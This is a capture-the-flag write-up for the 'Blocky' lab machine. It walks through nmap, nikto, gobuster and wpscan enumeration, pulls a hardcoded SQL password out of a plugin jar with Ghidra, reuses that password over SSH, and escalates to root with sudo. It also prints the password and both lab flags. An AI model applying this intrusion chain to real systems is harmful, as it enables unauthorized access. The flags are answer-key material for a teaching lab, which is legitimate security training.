### IP
`10.10.10.37`

# Recon

### nmap
`nmap -sC -sV 10.10.10.37 -o Blocky.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 16:26 EST
Nmap scan report for 10.10.10.37
Host is up (0.049s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```
* Looks like we have ftp on port 21, but with version ProFTPD
* ssh is running but that might not be too interesting
* There's a website running with wordpress on an apache server on port 80
* And apparently port 8192 is closed, but accessible? weird

### nikto
`nikto -host 10.10.10.37`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.37
+ Target Hostname:    10.10.10.37
+ Target Port:        80
+ Start Time:         2020-11-23 16:30:42 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 8015 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2020-11-23 16:38:59 (GMT-5) (497 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* `/wp-links-opml.php` tells us this is wp version 4.8

### gobuster
`gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirb/common.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.37
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/23 16:31:27 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.php (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/wiki (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
===============================================================
2020/11/23 16:31:53 Finished
===============================================================
```
* `/wp-includes/`has a bunch of files listed
* `/wp-admin/` has a login page
	* so does `/phpmyadmin/`
* `/plugins/` has some `.jar` files in it

### wpscan
`wpscan --url 10.10.10.37 --enumerate u`
```
[+] URL: http://10.10.10.37/ [10.10.10.37]
[+] Started: Mon Nov 23 17:38:07 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Nov 23 17:38:10 2020
[+] Requests Done: 25
[+] Cached Requests: 35
[+] Data Sent: 5.952 KB
[+] Data Received: 174.203 KB
[+] Memory used: 154.66 MB
[+] Elapsed time: 00:00:03

```
* We can see there's a username `notch` and `Notch` showing up
	* Trying several usernames on `http://10.10.10.37/wp-login.php?action=lostpassword`, we can tell that casing doesnt matter


# Exploitation

### ghidra

* Remember that there were a couple java archives in the plugins folder
* I dowloaded the one called `BlockyCore.jar` and disassembled it in ghidra
* Looking at the main function, we can see the following information:
```

/* Flags:
     ACC_PUBLIC
   
   public BlockyCore()  */

void <init>_void(BlockyCore this)

{
  this.<init>();
  this.sqlHost = "localhost";
  this.sqlUser = "root";
  this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  return;
}
```


### ssh
* Let's try to ssh into the box with the credentials we got: `ssh notch@10.10.10.37`
	* Type in the password `8YsqfCTnvxAUeduzjNSXe22`
* Looks like they reused credentials.
* We can `cat user.txt`
	* The user flag is `59fee0977fb60b8a0bc6e41e751f3cd5`
	* Note that you could have also done this with ftp and the same credentials
* Now, we can check sudo priveleges with `sudo -l` and typing in the same password. We get the following output:
```
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
* Look's like the user can run anything on the machine as root
* Let's run `sudo sh` and type in the password to get a root shell
* Now we can `cd /` and `cat root.txt`
	* The root flag is `0a9694a5b4d272c694679f7860f1cd5f`
